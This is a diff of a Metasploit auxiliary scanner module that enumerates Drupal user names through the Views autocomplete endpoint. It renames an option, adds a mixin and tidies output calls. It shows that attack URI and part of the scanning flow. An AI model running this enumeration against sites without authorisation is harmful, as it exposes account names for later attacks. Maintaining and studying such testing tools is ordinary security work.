@@ -1,8 +1,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -10,6 +10,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
+	include Msf::Auxiliary::WmapScanServer
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
 
@@ -35,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				OptString.new('URIPATH', [true, "Drupal Path", "/"]),
+				OptString.new('PATH', [true, "Drupal Path", "/"])
 			], self.class)
 	end
 
@@ -57,20 +58,20 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run_host(ip)
 		# Make sure the URIPATH begins with '/'
-		if datastore['URIPATH'][0] != '/'
-			datastore['URIPATH'] = '/' + datastore['URIPATH']
+		if datastore['PATH'][0] != '/'
+			datastore['PATH'] = '/' + datastore['PATH']
 		end
 
 		# Make sure the URIPATH ends with /
-		if datastore['URIPATH'][-1] != '/'
-			datastore['URIPATH'] = datastore['URIPATH'] + '/'
+		if datastore['PATH'][-1] != '/'
+			datastore['PATH'] = datastore['PATH'] + '/'
 		end
 
-		enum_uri = datastore['URIPATH'] + "?q=admin/views/ajax/autocomplete/user/"
+		enum_uri = datastore['PATH'] + "?q=admin/views/ajax/autocomplete/user/"
 
 		# Check if remote host is available or appears vulnerable
 		if not check(enum_uri)
-			print_error("#{ip} does not appear to be vulnerable, will not continue")
+			print_status("#{ip} does not appear to be vulnerable, will not continue")
 			return
 		end
 
@@ -97,7 +98,7 @@ class Metasploit3 < Msf::Auxiliary
 			else
 				print_error("Unexpected results from server")
 				return
-			end	
+			end
 		end
 
 		final_results = results.flatten.uniq
